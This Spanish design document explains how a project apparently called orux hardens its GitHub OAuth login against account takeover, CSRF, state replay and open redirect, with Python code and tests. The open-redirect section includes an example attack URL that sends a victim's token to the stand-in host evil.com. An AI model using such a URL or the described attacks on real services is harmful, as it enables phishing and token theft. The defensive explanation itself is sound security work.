# Seguridad: OAuth GitHub

El flujo OAuth tiene 4 superficies de ataque que mitigamos explícitamente: takeover de identidad, CSRF (callback inducido), replay del state, open redirect.

## Threat model

1. **Atacante que controla un sitio externo** (`evil.com`): puede hacer que la víctima visite URLs, abrir popups, ejecutar JS.
2. **Atacante que ya tiene cuenta**: puede pre-registrar usernames.
3. **Atacante que intercepta el callback** (MITM, extensión browser, plugin malicioso): puede ver `?code=...&state=...` pasando.

## Mitigación 1: Namespace `gh:<login>` (anti-takeover)

**Ataque**: el atacante pre-registra el username `torvalds` con su propia password. Cuando el verdadero `torvalds` entra por GitHub:

- `asegurar_externo("torvalds")` ve que ya existe → no crea nada.
- Emite token para `torvalds`.
- El verdadero `torvalds` cae en la cuenta cuya password el atacante conoce.

**Mitigación**: el OAuth crea identidades con namespace `gh:`. `validar_nuevo_usuario` RECHAZA registrar `gh:*`. Las identidades OAuth y las de contraseña viven en espacios disjuntos:

```python
identidad_github({"login": "torvalds"}) == "gh:torvalds"
```

Tests fijan el contrato:

```python
def test_identidad_oauth_no_colisiona_con_cuenta_de_password():
    store = UserStore()
    store.registrar("torvalds", "secreto123")
    assert identidad_github({"login": "torvalds"}) == "gh:torvalds"
    assert store.existe("torvalds") is True
    assert store.existe("gh:torvalds") is False  # disjuntos
```

### Trade-off

El prefijo `gh:` se ve en la UI (`gh:torvalds` en presencia, en commits). **Cosmético**, se pule con un display-name si molesta. **La seguridad no se negocia** en un instance ya desplegado: si quitamos el prefijo, todos los ownership de cuentas OAuth se quedan refiriendo al login pelado, abriendo el takeover retroactivamente.

## Mitigación 2: State CSRF firmado

**Ataque**: el atacante inicia el flujo OAuth en su propio browser, obtiene el `code` de GitHub, induce a la víctima a visitar `https://orux.space/oauth/github/callback?code=<código_atacante>&state=<algo>`. Si el server no valida que el state lo emitió él mismo, la víctima termina logueada como el atacante.

**Mitigación**: el state se firma con HMAC del server. Sin el secret, nadie puede falsificarlo:

```python
def firmar_state(secret, ahora=None):
    ts = str(int(ahora if ahora else time.time()))
    return f"{ts}.{_firma_state(ts, secret)}"

def _firma_state(ts, secret):
    return hmac.new(secret.encode(), ts.encode("ascii"), sha256).hexdigest()
```

`validar_state(state, secret, max_edad=120, ahora?) -> bool`:

```python
def validar_state(state, secret, max_edad=120.0, ahora=None):
    try:
        ts_str, firma = state.split(".", 1)
    except (ValueError, AttributeError):
        return False
    if not hmac.compare_digest(firma, _firma_state(ts_str, secret)):
        return False
    try:
        emitido = int(ts_str)
    except ValueError:
        return False
    t = ahora if ahora else time.time()
    return 0 <= (t - emitido) <= max_edad
```

Decisiones:

- **Stateless**: no se guarda nada en el server. Validez por firma + antigüedad.
- **`hmac.compare_digest`**: timing-safe (no leakea info por timing).
- **Reloj manipulado**: rechaza también states "del futuro" (`t < emitido`). Defensa contra ataques que dependen de relojes adelantados.
- **TTL = 120s** (BACKEND-AUDIT-0015): el flujo OAuth normalmente se completa en <10s; 120s deja holgura para usuarios lentos sin abrir una ventana grande de replay.

Antes era 600s. Bajado por defensa en profundidad — menor superficie de replay.

## Mitigación 3: Anti-replay del state (set efímero)

`validar_state` solo valida que la firma es legítima y reciente. Un atacante que **intercepta el callback** (extensión browser, MITM intra-LAN, etc.) podría reusar el mismo `code+state` durante 120s.

**Mitigación adicional** (BACKEND-AUDIT-0015): set efímero de states ya consumidos.

```python
_oauth_states_usados: dict[str, float] = {}

def _state_consumir(state, ahora):
    """True si pudo consumir (primer uso); False si replay."""
    # GC perezoso (>1024 entradas → barre >300s)
    if len(_oauth_states_usados) > 1024:
        corte = ahora - 300.0
        for k, v in list(_oauth_states_usados.items()):
            if v < corte:
                _oauth_states_usados.pop(k, None)
    if state in _oauth_states_usados:
        return False
    _oauth_states_usados[state] = ahora
    return True
```

Tras `validar_state` exitoso:

```python
if not _state_consumir(state, time.time()):
    logger.warning("OAuth state replay detectado")
    return _volver(error="state")
```

### Limitación

Es un set **local del proceso**. Si en el futuro hay réplicas múltiples de `api` (uvicorn --workers >1 o multi-pod), un attacker pueden hacer round-robin de réplicas para evadir. Solución futura: externalizar a Postgres con TTL.

Hoy en producción `api` es un solo proceso → suficiente.

### INVARIANTE

`_state_consumir` debe permanecer **100% sync** (sin `await`). El patrón "check si está, agregar si no" es atómico dentro de un mismo proceso CPython (el GIL bloquea entre bytecodes). Si entra un `await` adentro, hay que añadir un `asyncio.Lock` o externalizar el estado.

## Mitigación 4: Anti open-redirect

**Ataque**: el cliente pasa `?app=<url>` en `/oauth/github/login` indicando a dónde redirigir tras OAuth. Sin validación, un atacante manda:

```
https://orux.space/oauth/github/login?app=https://evil.com/phish?token={STOLEN}
```

La víctima termina en `evil.com` con su token en la URL.

**Mitigación**: `_sanitizar_app_url(crudo, public_url)` valida que la URL final sea bajo `public_url`:

```python
def _sanitizar_app_url(crudo, public_url):
    if not crudo:
        return public_url + "/app/"
    try:
        parsed = urlparse(crudo)
    except Exception:
        return public_url + "/app/"
    # Rechaza scheme/host externos
    if parsed.scheme not in ("", "http", "https"):
        return public_url + "/app/"
    if parsed.netloc and parsed.netloc != urlparse(public_url).netloc:
        return public_url + "/app/"
    return crudo
```

Si el `app` URL viene con scheme/host externo: ignora y usa el default seguro (`public_url/app/`).

## Scope mínimo

`SCOPE = "read:user user:email"`. No pedimos `repo` (autocompletar clone/push se evalúa aparte). El consentimiento se mantiene inofensivo: el peor caso es leer email público y nombre del usuario.

Si más adelante queremos autocompletar URLs de repos del usuario, se agrega `read:org` o `repo` y se documenta el consentimiento.

## La parte de red (intercambio code → token)

`_intercambiar(code)`:

```python
def _intercambiar(code):
    """POST a https://github.com/login/oauth/access_token.
    Devuelve el perfil del usuario."""
    
    # 1. Intercambiar code → access_token
    req = urllib.request.Request(
        URL_TOKEN,
        data=urllib.parse.urlencode({
            "client_id": _GH_CLIENT_ID,
            "client_secret": _GH_CLIENT_SECRET,
            "code": code,
            "redirect_uri": _GH_REDIRECT,
        }).encode(),
        headers={"Accept": "application/json"},
    )
    with urllib.request.urlopen(req, timeout=10) as r:
        token_data = json.load(r)
    
    access_token = token_data["access_token"]
    
    # 2. Leer perfil del usuario
    req2 = urllib.request.Request(
        URL_PERFIL,
        headers={"Authorization": f"Bearer {access_token}", "Accept": "application/json"},
    )
    with urllib.request.urlopen(req2, timeout=10) as r:
        return json.load(r)
```

Defensas:

- **Timeout 10s** en ambas llamadas: GitHub caído no congela el server.
- **JSON Accept**: GitHub responde JSON con este header (sin él responde form-encoded).
- **El client_secret NUNCA sale del server**: solo viaja al endpoint de Token de GitHub.
- **El access_token de GitHub se descarta tras leer el perfil**: NO se guarda. Solo necesitamos la identidad (`login`).

Errores manejados (BACKEND-AUDIT-OAUTH-X):

- `urllib.error.URLError`: GitHub no responde → `_volver(error="github")`.
- `KeyError` en `token_data["access_token"]`: GitHub rechazó el code → `_volver(error="github")`.
- `TimeoutError`: idem.
- `ValueError` (en `identidad_github`): perfil sin login → `_volver(error="github")`.

## Configuración

Variables env requeridas para que OAuth funcione (sin ellas → 503):

| Var | Para qué |
|---|---|
| `ORUX_GH_CLIENT_ID` | El client_id de la app OAuth en GitHub |
| `ORUX_GH_CLIENT_SECRET` | El client_secret (NUNCA en el repo, NUNCA en logs) |
| `ORUX_GH_REDIRECT` | La URL absoluta del callback (`https://orux.space/oauth/github/callback`) |
| `ORUX_SESSION_SECRET` | El secret HMAC, COMPARTIDO entre `api` y `orux` contenedores |
| `ORUX_PUBLIC_URL` | URL pública del SPA (para `_sanitizar_app_url`) |

Sin `ORUX_SESSION_SECRET` env, el contenedor `api` no firma tokens compatibles con el contenedor `orux` (que verifica). El docker-compose los inyecta a ambos vía el mismo env.

Ver [`oauth-github.md`](../oauth-github.md) (raíz del repo) para el setup paso a paso en el dashboard de GitHub.

## Tests

`backend/tests/test_oauth.py` cubre todas las funciones puras (`identidad_github`, `firmar_state`, `validar_state`, `url_autorizacion`, `asegurar_externo`). Sin red — los vectores son JSONs conocidos y timestamps fijos.

Lo que NO se prueba en sandbox (sí en el VPS):

- Llamada real a GitHub (`_intercambiar`).
- Redirect del navegador post-login.
- Persistencia cross-restart (`asegurar_externo` idempotente).

## Diagnóstico

| Síntoma | Causa probable |
|---|---|
| `/oauth/github/login` → 503 | OAuth no configurado (falta `ORUX_GH_*` env) |
| Callback → `?oauth=error&reason=state` | State CSRF inválido (firma mala, vencido, replay) |
| Callback → `?oauth=error&reason=github` | Intercambio code→token falló. Revisar `docker compose logs api \| grep -i oauth` |
| Callback → `?oauth=error&reason=cancelado` | Usuario canceló consentimiento en GitHub |
| Token OAuth no valida en WS | Secrets distintos entre `api` y `orux` (`ORUX_SESSION_SECRET` env desincronizado) |
| Usuario logueado pero cuenta "no existe" | `asegurar_externo` falló (chequear logs); usuario externo demasiado largo o caracteres raros |
